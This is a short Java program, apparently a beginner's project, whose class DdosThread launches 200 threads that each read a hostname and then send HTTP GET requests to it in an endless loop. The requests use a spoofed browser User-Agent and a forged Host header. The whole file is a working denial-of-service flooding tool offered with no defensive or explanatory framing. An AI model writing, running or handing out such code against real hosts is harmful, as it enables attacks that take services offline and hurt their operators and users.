package com.example.firstapp;


import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Scanner;
import java.util.concurrent.atomic.AtomicBoolean;

public class FirstTask {

    public static void main(String[] args) throws Exception {
        for (int i = 0; i < 200; i++) {
            FirstTask.DdosThread thread = new FirstTask.DdosThread();
            thread.start();
        }
    }
    public static class DdosThread extends Thread {
        Scanner scan = new Scanner(System.in);

        {
            System.out.println("Enter hostname: ");
        }
        String andPoint = "http://" + scan.next();
        {
            System.out.println(andPoint);
        }

        private AtomicBoolean running = new AtomicBoolean(true);
        private final String request = andPoint;
        private final URL url;

        String param = null;

        public DdosThread() throws Exception {
            url = new URL(request);
            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        }


        @Override
        public void run() {
            while (running.get()) {
                try {
                    attack();
                } catch (Exception e) {
                    e.printStackTrace();

                }


            }
        }

        public void attack() throws Exception {
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("GET");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", "localhost");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);
            System.out.println(this + " " + connection.getResponseCode());
            System.out.flush();
            connection.getInputStream();
        }
    }

}
